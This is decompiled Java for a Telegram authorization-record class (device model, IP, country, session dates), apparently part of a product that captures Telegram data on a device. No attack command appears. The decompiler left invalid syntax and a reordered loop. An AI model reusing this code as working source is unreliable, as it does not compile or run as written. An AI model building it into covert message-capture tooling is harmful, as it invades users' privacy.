package com.vvt.capture.telegram.internal;

public class TLRPC$TL_authorization
  extends TLObject
{
  public static int constructor = 2079516406;
  public int api_id;
  public String app_name;
  public String app_version;
  public String country;
  public int date_active;
  public int date_created;
  public String device_model;
  public int flags;
  public long hash;
  public String ip;
  public String platform;
  public String region;
  public String system_version;
  
  public static TL_authorization TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    int i = constructor;
    Object localObject;
    if (i != paramInt)
    {
      if (paramBoolean)
      {
        localObject = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        Integer localInteger = Integer.valueOf(paramInt);
        arrayOfObject[0] = localInteger;
        String str = String.format("can't parse magic %x in TL_authorization", arrayOfObject);
        ((RuntimeException)localObject).<init>(str);
        throw ((Throwable)localObject);
      }
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return (TL_authorization)localObject;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_authorization;
      ((TL_authorization)localObject).<init>();
      ((TL_authorization)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
  }
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.hash = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.flags = i;
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.device_model = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.platform = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.system_version = str;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.api_id = i;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.app_name = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.app_version = str;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date_created = i;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date_active = i;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.ip = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.country = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.region = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.hash;
    paramAbstractSerializedData.writeInt64(l);
    i = this.flags;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.device_model;
    paramAbstractSerializedData.writeString(str);
    str = this.platform;
    paramAbstractSerializedData.writeString(str);
    str = this.system_version;
    paramAbstractSerializedData.writeString(str);
    i = this.api_id;
    paramAbstractSerializedData.writeInt32(i);
    str = this.app_name;
    paramAbstractSerializedData.writeString(str);
    str = this.app_version;
    paramAbstractSerializedData.writeString(str);
    i = this.date_created;
    paramAbstractSerializedData.writeInt32(i);
    i = this.date_active;
    paramAbstractSerializedData.writeInt32(i);
    str = this.ip;
    paramAbstractSerializedData.writeString(str);
    str = this.country;
    paramAbstractSerializedData.writeString(str);
    str = this.region;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_authorization.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */